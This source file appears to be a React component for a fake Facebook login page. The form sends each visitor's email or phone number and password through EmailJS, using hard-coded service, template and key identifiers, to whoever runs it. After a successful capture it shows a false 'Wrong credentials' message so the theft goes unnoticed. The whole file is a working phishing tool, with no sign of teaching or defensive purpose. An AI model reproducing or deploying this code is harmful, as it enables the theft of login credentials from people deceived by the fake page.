import React,{useState,useRef} from 'react'
import { BsInfoCircleFill } from "react-icons/bs";
import {Icon} from 'react-icons-kit';
import {eyeOff} from 'react-icons-kit/feather/eyeOff';
import {eye} from 'react-icons-kit/feather/eye'
import emailjs from '@emailjs/browser';

import '../CSS-Components/pageCSS.css'
function Pages() {
    const [myValue,setMyValue] = useState("")
    const [message,setMessage] = useState("")
    const [type, setType] = useState('password');
    const [icon, setIcon] = useState(eyeOff);
    const [loading,setLoading] =useState("")
    const form = useRef();
    const togglePasswordVisibility = () => {
        if (type==='password'){
            setIcon(eye);
            setType('text')
         } else {
            setIcon(eyeOff)
            setType('password')
         }
         
      };
 
      const sendEmail = (e) => {
        e.preventDefault();
        
        emailjs
          .sendForm('service_q77ns6h', 'template_ctc2l5g', form.current, {
            publicKey: 'jK8EKpaZoiCpSdAB7',
          })
          .then(
            (res) => {
              console.log('SUCCESS!');
              setMessage(res.status)
            },
            (error) => {
              console.log('FAILED...', error.text);
            },
          );
      };
  return (
    <div className='container'>
    
       <p className='facebook'>facebook</p>
        <div className='warning'>
            <div className='icon'><BsInfoCircleFill style={{color:"white"}}/></div>
            <p className='words'>You must log in to continue.</p>
         </div>
       <div className='input-container'>
        <p className='log'>Log in to Facebook</p>
        {message ? (<div className='err-mesg'>
              <p className='wrong-credentials'>Wrong credentials</p>
              <p className='invalid'>Invalid username or password</p>
            </div>): (
              <div className='warning2'>
              <p className='words2'>You must log in to continue.</p>
              </div>
            )}
       
       <form ref={form} onSubmit={sendEmail}>
       <input className='myInput' placeholder='Email address or phone number' type='text' name='to_name'/>
       <div className='typeEvent'>
       <input placeholder='Password'
        className='password'
        type={type}
        value={myValue}
        onChange={(event) => setMyValue(event.target.value)}
        name='user_password'
        />
         {myValue.length > 0 ? (
            <button onClick={togglePasswordVisibility} className='eye-btn'>
            <Icon clasNames="absolute" icon={icon} style={{fontSize:"2rem"}}/>
            </button>
         ):""}
      
       </div>
       <button className='btn-log' type='submit'>
        <p className='logIn'>Log in</p>
       </button>
       </form>
       <p className='f-password'>Forgotten account?</p>
      <div className='div-line'>
      <div className='left-side'></div> or <div className='right-side'></div>
      </div>
      <button className='c-new-acct'>
        <p className='new-acct'>Create new account</p>
      </button>
     </div>
   </div>
  )
}

export default Pages